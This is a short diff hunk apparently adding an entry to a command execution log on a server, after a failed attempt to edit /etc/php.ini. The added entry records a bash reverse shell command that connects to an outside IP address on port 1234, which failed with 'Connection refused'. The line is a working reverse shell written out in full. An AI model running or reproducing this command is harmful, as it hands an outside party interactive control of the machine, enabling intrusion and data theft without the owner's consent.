@@ -3186,3 +3186,12 @@ STDERR:
 sed: can't read /etc/php.ini
 : No such file or directory
 ----------------------------------------
+[2026-04-12 17:21:16]
+COMMAND: /bin/bash -i >& /dev/tcp/160.191.183.126/1234 0>&1
+EXIT CODE: 1
+STDOUT:
+(no output)
+STDERR:
+/bin/sh: connect: Connection refused
+/bin/sh: /dev/tcp/160.191.183.126/1234: Connection refused
+----------------------------------------
